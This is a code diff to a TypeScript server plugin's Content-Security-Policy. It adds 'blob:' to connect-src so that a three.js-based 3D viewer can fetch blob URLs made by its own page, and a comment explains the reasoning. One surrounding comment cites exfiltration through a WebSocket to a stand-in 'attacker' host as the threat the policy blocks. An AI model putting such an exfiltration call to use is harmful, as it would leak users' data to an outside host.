@@ -644,8 +644,12 @@ export const corePlugin = fp<CorePluginOptions>(
           // exfiltrate through `new WebSocket('wss://attacker/…')` — so the
           // allowance is derived per request from the Host header the page
           // itself was served on (loopback, LAN ip, or proxied domain alike).
+          // And `blob:`: a page's own in-memory bytes read back with fetch, as a 3D viewer on an app's customer side reads the
+          // pictures packed inside a model it loaded (three.js's loaders fetch the blob URLs they make). A blob URL is only
+          // ever made by this origin's own page, so it reaches no other host.
           'connect-src': [
             "'self'",
+            'blob:',
             (req: IncomingMessage) => {
               const host = req.headers.host;
               return host === undefined || host === ''
